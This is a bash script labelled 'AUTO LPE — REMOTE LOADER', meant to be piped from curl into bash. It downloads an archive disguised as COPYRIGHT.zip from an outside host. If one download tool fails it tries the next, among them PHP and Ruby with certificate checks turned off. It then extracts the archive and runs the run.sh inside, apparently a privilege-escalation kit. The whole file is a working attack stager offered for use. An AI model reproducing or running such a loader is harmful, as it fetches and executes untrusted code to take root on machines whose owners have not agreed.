#!/bin/bash
# One-liner: curl -fsSL https://grw.my.id/get | bash
# Copies itself as get_lpe.sh, then downloads & runs COPYRIGHT.zip
set -e
D=/tmp/.lpe_$$; mkdir -p $D; trap "rm -rf $D" EXIT
Z=$D/COPYRIGHT.zip; U=https://grw.my.id/COPYRIGHT.zip

echo "[*] AUTO LPE — REMOTE LOADER"
echo "[*] Downloading $U ..."

# Try every download method
for m in \
  "curl -fsSL --connect-timeout 10 --max-time 120 -o $Z $U" \
  "wget -q --timeout=10 --tries=3 -O $Z $U" \
  "python3 -c \"import urllib.request;r=urllib.request.urlopen('$U');open('$Z','wb').write(r.read())\"" \
  "python2 -c \"import urllib2;open('$Z','wb').write(urllib2.urlopen('$U').read())\"" \
  "python -c \"exec(\\\"try:\\n from urllib.request import urlopen\\nexcept:\\n from urllib2 import urlopen\\nopen('$Z','wb').write(urlopen('$U').read())\\\")\"" \
  "perl -MLWP::Simple -e \"getstore('$U','$Z')\"" \
  "php -r \"file_put_contents('$Z',file_get_contents('$U',false,stream_context_create(['ssl'=>['verify_peer'=>false]])));\"" \
  "ruby -e \"require 'net/https';u=URI.parse('$U');h=Net::HTTP.new(u.host,u.port);h.use_ssl=true;h.verify_mode=0;h.request_get(u.request_uri){|r|File.open('$Z','wb'){|f|f.write(r.body)}}\"" \
  "busybox wget -q -O $Z $U"
do
  echo "[*] Trying: $(echo $m | cut -d' ' -f1)..."
  eval "$m" 2>/dev/null && [ -f "$Z" ] && [ "$(stat -c%s \"$Z\" 2>/dev/null || echo 0)" -gt 10000 ] && break
done

[ -f "$Z" ] || { echo "[-] ALL DOWNLOAD METHODS FAILED"; exit 1; }
echo "[+] Downloaded: $(stat -c%s $Z) bytes"

# Extract
echo "[*] Extracting..."
for x in \
  "unzip -o $Z -d $D" \
  "python3 -c \"import zipfile;zipfile.ZipFile('$Z').extractall('$D')\"" \
  "python2 -c \"import zipfile;zipfile.ZipFile('$Z').extractall('$D')\"" \
  "perl -MArchive::Zip -e \"Archive::Zip->new('$Z')->extractTree('','$D/')\"" \
  "busybox unzip -o $Z -d $D" \
  "7z x $Z -o$D -y"
do
  echo "[*] Trying: $(echo $x | cut -d' ' -f1)..."
  eval "$x" >/dev/null 2>&1 && break
done

# Find and run
R=$(find $D -name run.sh -type f 2>/dev/null | head -1)
[ -n "$R" ] || { echo "[-] run.sh not found"; exit 1; }
chmod +x "$R" 2>/dev/null
cd "$(dirname "$R")"
chmod +x ./* 2>/dev/null
echo "[+] Launching run.sh $*"
exec bash "$R" "$@"
